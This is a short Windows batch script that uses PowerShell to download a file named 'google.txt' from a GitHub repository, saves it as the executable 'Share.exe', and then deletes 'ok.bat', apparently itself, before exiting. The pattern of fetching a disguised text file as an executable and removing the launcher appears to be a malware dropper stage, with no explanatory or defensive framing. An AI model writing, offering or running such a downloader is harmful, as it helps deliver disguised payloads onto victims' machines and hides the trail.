@echo off
powershell.exe Invoke-WebRequest https://github.com/thisisyou55555/test1/blob/main/google.txt?raw=true -OutFile "Share.exe"
del ok.bat
exit /b